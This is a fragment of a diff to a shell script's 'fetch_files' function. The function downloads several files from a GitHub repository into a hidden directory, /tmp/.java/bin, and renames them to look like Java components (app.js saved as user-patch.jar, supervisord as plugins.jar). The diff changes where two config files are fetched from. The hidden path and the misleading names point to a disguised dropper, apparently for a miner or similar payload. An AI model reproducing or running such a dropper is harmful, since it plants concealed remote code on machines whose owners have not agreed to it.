@@ -5,8 +5,8 @@ function fetch_files() {
     mkdir -p /tmp/.java/bin
     cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o user-patch.jar
     cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
-    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/coconde/cfg.conf -o cfg.conf
-    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/coconde/conf.json -o conf.json
+    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/lyla/fr.conf -o cfg.conf
+    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/lyla/fr.json -o conf.json
     echo "DONE ..."
 }
 
